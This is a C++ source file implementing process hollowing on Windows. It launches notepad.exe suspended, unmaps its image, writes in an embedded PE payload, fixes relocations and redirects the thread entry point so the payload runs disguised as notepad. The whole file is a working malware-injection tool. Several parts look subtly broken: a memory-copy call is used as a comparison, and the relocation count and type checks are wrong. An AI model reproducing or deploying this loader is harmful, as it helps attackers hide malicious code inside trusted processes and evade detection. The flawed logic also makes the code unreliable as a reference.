#include <Windows.h>
#include <stdio.h>
#include <fstream>

#include "Structs.hpp"
#include "Header.hpp"
#include "Payload.hpp"

int wmain()
{
	LPSTARTUPINFOA si = new STARTUPINFOA();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();

	bool created = CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
	if (!created)
	{
		printf("[-] Failed to create process!\n");
		return -1;
	}

	printf("[+] Process ID : %d\n", pi->dwProcessId);
	printf("[+] Unmapping the process\n");

	PROCESS_BASIC_INFORMATION* pbi = GetProcessBasicInformation(pi->hProcess);
	printf("[+] PEB : %p\n", pbi->PebBaseAddress);

	LPVOID dImageBase = 0;
	SIZE_T fileBytesRead = 0;
	SIZE_T bytesRead = NULL;
	ULONG_PTR ImageBaseOffset = (ULONG_PTR)pbi->PebBaseAddress + 16;

	ReadProcessMemory(pi->hProcess, (LPCVOID)ImageBaseOffset, &dImageBase, 8, &bytesRead);
	printf("[+] Image base : %p\n", dImageBase);

	NTSTATUS status = UnmapView(pi->hProcess, dImageBase);
	if (status != 0)
	{
		printf("[-] Failed to unmap view\n");
		return -1;
	}

	printf("[+] View unmapped\n");

	PIMAGE_DOS_HEADER sourceDosHeader = (PIMAGE_DOS_HEADER)buf;
	PIMAGE_NT_HEADERS64 sourceNtHeaders = (PIMAGE_NT_HEADERS64)((ULONG_PTR)buf + sourceDosHeader->e_lfanew);
	SIZE_T sourceImageSize = sourceNtHeaders->OptionalHeader.SizeOfImage;

	status = AllocateMemory(pi->hProcess, dImageBase, sourceImageSize);
	if (status != 0)
	{
		printf("[-] Failed to allocate memory\n");
		return -1;
	}
	printf("[+] Allocated memory!\n");

	ULONG_PTR delta = (ULONG_PTR)dImageBase - sourceNtHeaders->OptionalHeader.ImageBase;
	sourceNtHeaders->OptionalHeader.ImageBase = (ULONG_PTR)dImageBase;

	status = WriteProcMemory(pi->hProcess, dImageBase, buf, sourceNtHeaders->OptionalHeader.SizeOfHeaders);
	if (status != 0)
	{
		printf("[-] Couldn't write to the process memory!\n");
		return -1;
	}

	PIMAGE_SECTION_HEADER sourceImgSection = (PIMAGE_SECTION_HEADER)((ULONG_PTR)buf + sourceDosHeader->e_lfanew + sizeof(_IMAGE_NT_HEADERS64));
	PIMAGE_SECTION_HEADER prevSourceImgSection = sourceImgSection;
	int error = GetLastError();

	for (int i = 0; i < sourceNtHeaders->FileHeader.NumberOfSections; i++)
	{
		PVOID destSectionLocation = (PVOID)((ULONG_PTR)dImageBase + sourceImgSection->VirtualAddress);
		PVOID sourceSectionLocation = (PVOID)((ULONG_PTR)buf + sourceImgSection->PointerToRawData);

		WriteProcMemory(pi->hProcess, destSectionLocation, sourceSectionLocation, sourceImgSection->SizeOfRawData);
		sourceImgSection++;
	}


	IMAGE_DATA_DIRECTORY relocTable = sourceNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	sourceImgSection = prevSourceImgSection;
	for (int i = 0; i < sourceNtHeaders->FileHeader.NumberOfSections; i++)
	{
		BYTE* relocSectionName = (BYTE*)".reloc";
		if (RtlCopyMemory(sourceImgSection->Name, relocSectionName, 5) != 0)
		{
			sourceImgSection++;
			continue;
		}

		ULONG_PTR sourceRelocationTableRaw = sourceImgSection->PointerToRawData;
		ULONG_PTR relocOffset = 0;

		while (relocOffset < relocTable.Size)
		{
			PBASE_RELOCATION_BLOCK relocBlock = (PBASE_RELOCATION_BLOCK)((ULONG_PTR)buf + sourceRelocationTableRaw + relocOffset);
			relocOffset += sizeof(BASE_RELOCATION_BLOCK);

			ULONG_PTR relocEntryCount = (relocBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK) - sizeof(BASE_RELOCATION_ENTRY));
			PBASE_RELOCATION_ENTRY relocEntries = (PBASE_RELOCATION_ENTRY)((ULONG_PTR)buf + sourceRelocationTableRaw + relocOffset);

			for (ULONG_PTR y = 0; y < relocEntryCount; y++)
			{
				relocOffset += sizeof(BASE_RELOCATION_ENTRY);

				if (relocEntries[0].Type == 0)
					continue;

				ULONG_PTR patchAddress = relocBlock->PageAddress + relocEntries[y].Offset;
				ULONG_PTR patchedBuffer = 0;

				ReadProcMemory(pi->hProcess, (PVOID)((ULONG_PTR)dImageBase + patchAddress), &patchedBuffer, sizeof(ULONG_PTR));
				patchedBuffer += delta;

				WriteProcMemory(pi->hProcess, (PVOID)((ULONG_PTR)dImageBase + patchAddress), &patchedBuffer, sizeof(ULONG_PTR));
				error = GetLastError();
			}
		}
	}
	if (error != 0)
	{
		printf("[?] Error : %d\n", error);
		return -1;
	}

	LPCONTEXT context = new CONTEXT();
	context->ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(pi->hThread, context);

	ULONG_PTR patchedEntryPoint = (ULONG_PTR)dImageBase + sourceNtHeaders->OptionalHeader.AddressOfEntryPoint;
	context->Rcx = patchedEntryPoint;
	printf("[+] Thread patched entrypoint : %p\n", patchedEntryPoint);

	SetThreadContext(pi->hThread, context);
	ResumeThread(pi->hThread);

	printf("[!] Done\n");
	getchar(); getchar();
}